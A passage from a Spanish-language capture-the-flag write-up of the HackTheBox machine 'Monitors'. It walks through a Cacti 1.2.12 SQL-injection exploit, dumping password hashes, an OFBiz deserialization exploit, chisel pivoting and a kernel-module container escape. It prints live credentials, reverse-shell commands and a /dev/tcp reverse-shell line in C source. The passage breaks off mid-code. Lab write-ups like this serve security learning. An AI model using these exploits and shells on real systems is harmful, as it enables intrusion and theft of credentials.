</span></span></code></pre></div><p>Sin embargo, esta contraseña no se reutiliza para SSH. Se puede notar que el código PHP no se está interpretando. Por este motivo, la técnica de <em>Log Poisoning</em> no tendría efecto en este caso.</p><p>A continuación, se puede tratar de leer la configuración del servidor Apache y ver cómo están descritos los <em>virtual hosts</em>, buscando el archivo <code>/etc/apache2/sites-enabled/000-default.conf</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl <span style=color:#e6db74>&#39;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/apache2/sites-enabled/000-default.conf&#39;</span> 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-apache data-lang=apache><span style=display:flex><span><span style=color:#75715e># Default virtual host settings</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Add monitors.htb.conf</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Add cacti-admin.monitors.htb.conf</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;VirtualHost</span> <span style=color:#e6db74>*:80</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>#ServerName www.example.com</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	ServerAdmin admin@monitors.htb
</span></span><span style=display:flex><span>	DocumentRoot <span style=color:#e6db74>/var/www/html</span>
</span></span><span style=display:flex><span>	Redirect <span style=color:#ae81ff>403</span> /
</span></span><span style=display:flex><span>	ErrorDocument <span style=color:#ae81ff>403</span> <span style=color:#e6db74>&#34;Sorry, direct IP access is not allowed. &lt;br&gt;&lt;br&gt;If you are having issues accessing the site then contact the website administrator: admin@monitors.htb&#34;</span> 
</span></span><span style=display:flex><span>	UseCanonicalName <span style=color:#66d9ef>Off</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>#LogLevel info ssl:warn</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	ErrorLog ${APACHE_LOG_DIR}/error.log
</span></span><span style=display:flex><span>	CustomLog ${APACHE_LOG_DIR}/access.log combined
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>#Include conf-available/serve-cgi-bin.conf</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/VirtualHost&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
</span></span></code></pre></div><h2 id=explotando-cacti>Explotando Cacti</h2><p>Como se puede ver, hay un subdominio llamado <code>cacti-admin.monitors.htb</code>:</p><p><img src=../../../images/HTB/Monitors/Monitors-cacti-login.png alt="Cacti administrator panel login"></p><p>Se trata de un panel de administrador protegido con usuario y contraseña. Utilizando las credenciales <code>admin:BestAdministrator@2020!</code>, encontradas anteriormente, se consigue acceder:</p><p><img src=../../../images/HTB/Monitors/Monitors-cacti.png alt="Cacti administrator panel"></p><p>La página está usando Cacti versión 1.2.12, que es vulnerable a inyección de código SQL:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ searchsploit cacti 1.2.12
</span></span><span style=display:flex><span>--------------------------------------------------------------- ---------------------- 
</span></span><span style=display:flex><span> Exploit Title                                                 |  Path
</span></span><span style=display:flex><span>--------------------------------------------------------------- ----------------------
</span></span><span style=display:flex><span> Cacti 1.2.12 - &#39;filter&#39; SQL Injection / Remote Code Execution | php/webapps/49810.py
</span></span><span style=display:flex><span>--------------------------------------------------------------- ----------------------
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span></code></pre></div><p>Se puede utilizar este <em>exploit</em> para conseguir acceso a la máquina como usuario <code>www-data</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p <span style=color:#e6db74>&#39;BestAdministrator@2020!&#39;</span> --lhost 10.10.17.44 --lport <span style=color:#ae81ff>4444</span> 
</span></span><span style=display:flex><span>[+] Connecting to the server...
</span></span><span style=display:flex><span>[+] Retrieving CSRF token...
</span></span><span style=display:flex><span>[+] Got CSRF token: sid:ab28037201e7a3e0416ab797984a3b7613f1d680,1625401332
</span></span><span style=display:flex><span>[+] Trying to log in...
</span></span><span style=display:flex><span>[+] Successfully logged in!
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] SQL Injection:
</span></span><span style=display:flex><span>&#34;name&#34;,&#34;hex&#34;
</span></span><span style=display:flex><span>&#34;&#34;,&#34;&#34;
</span></span><span style=display:flex><span>&#34;admin&#34;,&#34;$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK&#34;
</span></span><span style=display:flex><span>&#34;guest&#34;,&#34;43e9a4ab75570f5b&#34;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[+] Check your nc listener!
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ nc -nlvp <span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>Ncat: Version 7.92 ( https://nmap.org/ncat )
</span></span><span style=display:flex><span>Ncat: Listening on :::4444
</span></span><span style=display:flex><span>Ncat: Listening on 0.0.0.0:4444
</span></span><span style=display:flex><span>Ncat: Connection from 10.10.10.238.
</span></span><span style=display:flex><span>Ncat: Connection from 10.10.10.238:58344.
</span></span><span style=display:flex><span>/bin/sh: 0: can&#39;t access tty; job control turned off
</span></span><span style=display:flex><span>$ script /dev/null -c bash
</span></span><span style=display:flex><span>Script started, file is /dev/null
</span></span><span style=display:flex><span>www-data@monitors:/usr/share/cacti/cacti$ ^Z
</span></span><span style=display:flex><span>zsh: suspended  ncat -nlvp 4444
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ stty raw -echo; fg
</span></span><span style=display:flex><span>[1]  + continued  ncat -nlvp 4444
</span></span><span style=display:flex><span>                                 reset xterm
</span></span><span style=display:flex><span>www-data@monitors:/usr/share/cacti/cacti$ export TERM=xterm
</span></span><span style=display:flex><span>www-data@monitors:/usr/share/cacti/cacti$ export SHELL=bash
</span></span><span style=display:flex><span>www-data@monitors:/usr/share/cacti/cacti$ stty rows 50 columns 158 
</span></span></code></pre></div><h2 id=intrusión-en-la-máquina>Intrusión en la máquina</h2><p>Una vez en la máquina, si se accede a MySQL se puede encontrar el <em>hash</em> de la contraseña de <code>admin</code>, pero no se puede romper ni con <code>hashcat</code> ni con <code>john</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@monitors:/usr/share/cacti/cacti$ mysql -u wpadmin -p
</span></span><span style=display:flex><span>Enter password:
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>mysql&gt; show databases;
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span>| Database           |
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span>| information_schema |
</span></span><span style=display:flex><span>| wordpress          |
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span>2 rows in set (0.01 sec)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>mysql&gt; use wordpress;
</span></span><span style=display:flex><span>Reading table information for completion of table and column names
</span></span><span style=display:flex><span>You can turn off this feature to get a quicker startup with -A
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Database changed
</span></span><span style=display:flex><span>mysql&gt; show tables;
</span></span><span style=display:flex><span>+-----------------------+
</span></span><span style=display:flex><span>| Tables_in_wordpress   |
</span></span><span style=display:flex><span>+-----------------------+
</span></span><span style=display:flex><span>| ...                   |
</span></span><span style=display:flex><span>| wp_users              |
</span></span><span style=display:flex><span>+-----------------------+
</span></span><span style=display:flex><span>12 rows in set (0.00 sec)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>mysql&gt; describe wp_users;
</span></span><span style=display:flex><span>+--------------+---------------------+------+-----+---------+----------------+ 
</span></span><span style=display:flex><span>| Field        | Type                | Null | Key | Default | Extra          |
</span></span><span style=display:flex><span>+--------------+---------------------+------+-----+---------+----------------+
</span></span><span style=display:flex><span>| ID           | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
</span></span><span style=display:flex><span>| user_login   | varchar(60)         | NO   | MUL |         |                |
</span></span><span style=display:flex><span>| user_pass    | varchar(255)        | NO   |     |         |                |
</span></span><span style=display:flex><span>| ...          | ...                 | ...  | ... | ...     | ...            |
</span></span><span style=display:flex><span>+--------------+---------------------+------+-----+---------+----------------+
</span></span><span style=display:flex><span>10 rows in set (0.00 sec)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>mysql&gt; select user_login, user_pass from wp_users;
</span></span><span style=display:flex><span>+------------+------------------------------------+
</span></span><span style=display:flex><span>| user_login | user_pass                          |
</span></span><span style=display:flex><span>+------------+------------------------------------+
</span></span><span style=display:flex><span>| admin      | $P$Be7cx.OsLozVI5L6DD60LLZNoHW9dZ0 |
</span></span><span style=display:flex><span>+------------+------------------------------------+
</span></span><span style=display:flex><span>1 row in set (0.00 sec)
</span></span></code></pre></div><p>Al usar <code>ifconfig</code> se ve que la máquina tiene contenedores de Docker en ejecución, ya que hay una subred llamada <code>docker0</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@monitors:/usr/share/cacti/cacti$ ifconfig
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span></span><span style=display:flex><span>        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
</span></span><span style=display:flex><span>        inet6 fe80::42:3dff:fee9:d62f  prefixlen 64  scopeid 0x20&lt;link&gt;
</span></span><span style=display:flex><span>        ether 02:42:3d:e9:d6:2f  txqueuelen 0  (Ethernet)
</span></span><span style=display:flex><span>        RX packets 2637  bytes 192831 (192.8 KB)
</span></span><span style=display:flex><span>        RX errors 0  dropped 0  overruns 0  frame 0
</span></span><span style=display:flex><span>        TX packets 4213  bytes 3273053 (3.2 MB)
</span></span><span style=display:flex><span>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>ens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
</span></span><span style=display:flex><span>        inet 10.10.10.238  netmask 255.255.255.0  broadcast 10.10.10.255
</span></span><span style=display:flex><span>        inet6 fe80::250:56ff:feb9:d51b  prefixlen 64  scopeid 0x20&lt;link&gt;
</span></span><span style=display:flex><span>        inet6 dead:beef::250:56ff:feb9:d51b  prefixlen 64  scopeid 0x0&lt;global&gt; 
</span></span><span style=display:flex><span>        ether 00:50:56:b9:d5:1b  txqueuelen 1000  (Ethernet)
</span></span><span style=display:flex><span>        RX packets 18062  bytes 7956984 (7.9 MB)
</span></span><span style=display:flex><span>        RX errors 0  dropped 70  overruns 0  frame 0
</span></span><span style=display:flex><span>        TX packets 7700  bytes 4809781 (4.8 MB)
</span></span><span style=display:flex><span>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>...
</span></span></code></pre></div><h2 id=analizando-el-contenedor-de-docker>Analizando el contenedor de Docker</h2><p>De hecho, hay un contenedor en la dirección <code>172.17.0.2</code>. Podemos transferir el binario de <code>nmap</code> a la máquina para realizar un escaneo de puertos en la máquina y en el contenedor:</p><p>Como la máquina tiene <code>nc</code>, se puede utilizar para transferir el archivo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ nc 10.10.10.238 <span style=color:#ae81ff>1234</span> &lt; <span style=color:#66d9ef>$(</span>which nmap<span style=color:#66d9ef>)</span> 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@monitors:/usr/share/cacti/cacti$ cd /tmp
</span></span><span style=display:flex><span>www-data@monitors:/tmp$ which nc
</span></span><span style=display:flex><span>/bin/nc
</span></span><span style=display:flex><span>www-data@monitors:/tmp$ nc -nlvp 1234 &gt; .nmap
</span></span><span style=display:flex><span>Listening on [0.0.0.0] (family 0, port 1234)
</span></span><span style=display:flex><span>Connection from 10.10.17.44 64550 received!
</span></span><span style=display:flex><span>www-data@monitors:/tmp$ chmod +x .nmap
</span></span><span style=display:flex><span>www-data@monitors:/tmp$ ./.nmap -p- localhost
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-07-03 19:12 UTC 
</span></span><span style=display:flex><span>Unable to find nmap-services!  Resorting to /etc/services
</span></span><span style=display:flex><span>Cannot find nmap-payloads. UDP payloads are disabled.
</span></span><span style=display:flex><span>Nmap scan report for localhost (127.0.0.1)
</span></span><span style=display:flex><span>Host is up (0.000078s latency).
</span></span><span style=display:flex><span>Not shown: 65528 closed ports
</span></span><span style=display:flex><span>PORT     STATE SERVICE
</span></span><span style=display:flex><span>22/tcp   open  ssh
</span></span><span style=display:flex><span>80/tcp   open  http
</span></span><span style=display:flex><span>3306/tcp open  mysql
</span></span><span style=display:flex><span>4444/tcp open  unknown
</span></span><span style=display:flex><span>8080/tcp open  http-alt
</span></span><span style=display:flex><span>8443/tcp open  unknown
</span></span><span style=display:flex><span>9988/tcp open  unknown
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
</span></span><span style=display:flex><span>www-data@monitors:/tmp$ ./nmap -p- 172.17.0.2
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-07-03 19:13 UTC
</span></span><span style=display:flex><span>Unable to find nmap-services!  Resorting to /etc/services
</span></span><span style=display:flex><span>Cannot find nmap-payloads. UDP payloads are disabled.
</span></span><span style=display:flex><span>Nmap scan report for 172.17.0.2
</span></span><span style=display:flex><span>Host is up (0.00014s latency).
</span></span><span style=display:flex><span>Not shown: 65532 closed ports
</span></span><span style=display:flex><span>PORT      STATE SERVICE
</span></span><span style=display:flex><span>8080/tcp  open  http-alt
</span></span><span style=display:flex><span>8443/tcp  open  unknown
</span></span><span style=display:flex><span>38279/tcp open  unknown
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Nmap done: 1 IP address (1 host up) scanned in 1.37 seconds
</span></span></code></pre></div><p>Ahora, se puede realizar un reenvío de puertos con <a href=https://github.com/jpillora/chisel><code>chisel</code></a> para acceder a la web desde la máquina de atacante:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ nc 10.10.10.238 <span style=color:#ae81ff>1234</span> &lt; chisel
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ ./chisel server -p <span style=color:#ae81ff>1337</span> --reverse
</span></span><span style=display:flex><span>server: Reverse tunnelling enabled
</span></span><span style=display:flex><span>server: Fingerprint lEVau5AqQ5yJn+cIJcdKHCOmSYVFY67kTuCt1JtmjtY= 
</span></span><span style=display:flex><span>server: Listening on http://0.0.0.0:1337
</span></span><span style=display:flex><span>server: session#1: tun: proxy#R:8443=&gt;8443: Listening
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>www-data@monitors:/tmp$ nc -nlvp 1234 &gt; .chisel
</span></span><span style=display:flex><span>Listening on [0.0.0.0] (family 0, port 1234)
</span></span><span style=display:flex><span>Connection from 10.10.17.44 64550 received!
</span></span><span style=display:flex><span>www-data@monitors:/tmp$ chmod +x .chisel
</span></span><span style=display:flex><span>www-data@monitors.htb:/tmp$ ./.chisel client 10.10.17.44:1337 R:8443:172.17.0.2:8443 
</span></span><span style=display:flex><span>client: Connecting to ws://10.10.17.44:1337
</span></span><span style=display:flex><span>client: Connected (Latency 109.928393ms)
</span></span></code></pre></div><p>El contenedor de Docker está corriendo un servidor web en los puertos 8080 y 8443. Se puede utilizar <code>gobuster</code> desde la máquina (transfiriendo el archivo binario y el diccionario con <code>nc</code>) para descubrir algunar rutas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ gobuster dir -u https://127.0.0.1:8443 -k -w $WORDLISTS/directory-list-2.3-medium.txt -q 
</span></span><span style=display:flex><span>/images               (Status: 302) [Size: 0] [--&gt; /images/]
</span></span><span style=display:flex><span>/content              (Status: 302) [Size: 0] [--&gt; /content/]
</span></span><span style=display:flex><span>/common               (Status: 302) [Size: 0] [--&gt; /common/]
</span></span><span style=display:flex><span>/catalog              (Status: 302) [Size: 0] [--&gt; /catalog/]
</span></span><span style=display:flex><span>/marketing            (Status: 302) [Size: 0] [--&gt; /marketing/]
</span></span><span style=display:flex><span>/ecommerce            (Status: 302) [Size: 0] [--&gt; /ecommerce/]
</span></span><span style=display:flex><span>/ap                   (Status: 302) [Size: 0] [--&gt; /ap/]
</span></span><span style=display:flex><span>/ar                   (Status: 302) [Size: 0] [--&gt; /ar/]
</span></span><span style=display:flex><span>/ebay                 (Status: 302) [Size: 0] [--&gt; /ebay/]
</span></span><span style=display:flex><span>/manufacturing        (Status: 302) [Size: 0] [--&gt; /manufacturing/]
</span></span><span style=display:flex><span>/passport             (Status: 302) [Size: 0] [--&gt; /passport/]
</span></span><span style=display:flex><span>/example              (Status: 302) [Size: 0] [--&gt; /example/]
</span></span><span style=display:flex><span>/bi                   (Status: 302) [Size: 0] [--&gt; /bi/]
</span></span><span style=display:flex><span>/accounting           (Status: 302) [Size: 0] [--&gt; /accounting/]
</span></span><span style=display:flex><span>/webtools             (Status: 302) [Size: 0] [--&gt; /webtools/]
</span></span><span style=display:flex><span>/tomahawk             (Status: 302) [Size: 0] [--&gt; /tomahawk/]
</span></span><span style=display:flex><span>/facility             (Status: 302) [Size: 0] [--&gt; /facility/]
</span></span><span style=display:flex><span>/myportal             (Status: 302) [Size: 0] [--&gt; /myportal/]
</span></span><span style=display:flex><span>/sfa                  (Status: 302) [Size: 0] [--&gt; /sfa/]
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>El servidor contiene un Apache OFBiz 17.12.01:</p><p><img src=../../../images/HTB/Monitors/Monitors-OFBiz.png alt="Página web de OFBiz"></p><p>La siguiente respuesta es extraña, pero las credenciales mostradas no son válidas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl https://localhost:8443/webtools/control/main -k 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!-- ... --&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;screenlet-body&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>div</span>&gt;For something interesting make sure you are logged in, try username: admin, password: ofbiz.&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>br</span> /&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>div</span>&gt;NOTE: If you have not already run the installation data loading script, from the ofbiz home directory run &amp;quot;gradlew loadAll&amp;quot; or &amp;quot;java -jar build&amp;#x2f;libs&amp;#x2f;ofbiz.jar -l&amp;quot;&lt;/<span style=color:#f92672>div</span>&gt; 
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>br</span> /&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>div</span>&gt;&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://localhost:8443/webtools/control/checkLogin&#34;</span>&gt;Login&lt;/<span style=color:#f92672>a</span>&gt;&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!-- ... --&gt;</span>
</span></span></code></pre></div><h2 id=explotando-ofbiz>Explotando OFBiz</h2><p>Buscando en Internet por <em>exploits</em>, se puede encontrar el siguiente repositorio de GitHub: <a href=https://github.com/g33xter/CVE-2020-9496>CVE-2020-9496</a>, que contiene una prueba de concepto (PoC) para explotar una deserialización insegura en Java mediante XML-RPC en OFBiz 17.12.01, haciendo uso de <a href=https://github.com/frohoff/ysoserial>ysoserial</a>.</p><p>Por comodidad, la PoC se reescribió en un <em>script</em> en Bash llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Monitors/deserialization.sh><code>deserialization.sh</code></a> para ejecutarlo más fácilmente (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Monitors#deserializationsh>aquí</a>).</p><p>Para realizar la explotación, se necesita un servidor web para exponer un archivo con un comando de <em>reverse shell</em>, por ejemplo con Python:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ python3 -m http.server <span style=color:#ae81ff>80</span>
</span></span><span style=display:flex><span>Serving HTTP on :: port 80 (http://[::]:80/) ... 
</span></span></code></pre></div><p>Y se utiliza <code>nc</code> para obtener acceso al contenedor de Docker. Y entonces, se ejecuta el <em>script</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ bash deserialization.sh 10.10.17.44 <span style=color:#ae81ff>4444</span> ./ysoserial.jar 
</span></span></code></pre></div><p>Y se obtiene la conexión:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ nc -nlvp <span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>Ncat: Version 7.92 ( https://nmap.org/ncat )
</span></span><span style=display:flex><span>Ncat: Listening on :::4444
</span></span><span style=display:flex><span>Ncat: Listening on 0.0.0.0:4444
</span></span><span style=display:flex><span>Ncat: Connection from 10.10.10.238.
</span></span><span style=display:flex><span>Ncat: Connection from 10.10.10.238:53352.
</span></span><span style=display:flex><span>bash: cannot set terminal process group (31): Inappropriate ioctl for device 
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# script /dev/null -c bash
</span></span><span style=display:flex><span>script /dev/null -c bash
</span></span><span style=display:flex><span>Script started, file is /dev/null
</span></span><span style=display:flex><span>root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# ^Z
</span></span><span style=display:flex><span>zsh: suspended  ncat -nlvp 4444
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ stty raw -echo; fg
</span></span><span style=display:flex><span>[1]  + continued  ncat -nlvp 4444
</span></span><span style=display:flex><span>                                 reset xterm
</span></span><span style=display:flex><span>root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# export TERM=xterm
</span></span><span style=display:flex><span>root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# export SHELL=bash
</span></span><span style=display:flex><span>root@ed0b91ea1876:/usr/src/apache-ofbiz-17.12.01# stty rows 50 columns 158
</span></span></code></pre></div><h2 id=escapando-del-contenedor-de-docker>Escapando del contenedor de Docker</h2><p>El siguiente paso es llevar a cabo una escapada del contenedor. Este tiene la <em>capability</em> <code>CAP_SYS_MODULE</code> habilitada. Como se explica en <a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_module>HackTricks</a>:</p><blockquote>
<p><em>The container has SYS_MODULE capability. As a result, the container can insert/remove kernel modules in/from the kernel of the Docker host machine.</em></p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>root@4e5701e892a5:/tmp# capsh --print
</span></span><span style=display:flex><span>Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip 
</span></span><span style=display:flex><span>Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
</span></span><span style=display:flex><span>Securebits: 00/0x0/1&#39;b0
</span></span><span style=display:flex><span> secure-noroot: no (unlocked)
</span></span><span style=display:flex><span> secure-no-suid-fixup: no (unlocked)
</span></span><span style=display:flex><span> secure-keep-caps: no (unlocked)
</span></span><span style=display:flex><span>uid=0(root)
</span></span><span style=display:flex><span>gid=0(root)
</span></span><span style=display:flex><span>groups=
</span></span></code></pre></div><p>Siguiendo el artículo, se pueden crear unos archivos <code>reverse.c</code> y <code>Makefile</code> y transferirlos al contenedor (mediante <code>nc</code> a la máquina y después al contenedor usando <code>curl</code>). También es necesario transferir <code>nc</code> de la máquina al contenedor.</p><p><code>reverse.c</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/kmod.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;linux/module.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>MODULE_LICENSE(<span style=color:#e6db74>&#34;GPL&#34;</span>);
</span></span><span style=display:flex><span>MODULE_AUTHOR(<span style=color:#e6db74>&#34;AttackDefense&#34;</span>);
</span></span><span style=display:flex><span>MODULE_DESCRIPTION(<span style=color:#e6db74>&#34;LKM reverse shell module&#34;</span>);
</span></span><span style=display:flex><span>MODULE_VERSION(<span style=color:#e6db74>&#34;1.0&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> argv[] <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;/bin/bash&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>, <span style=color:#e6db74>&#34;bash -i &gt;&amp; /dev/tcp/172.17.0.2/4444 0&gt;&amp;1&#34;</span>, NULL };
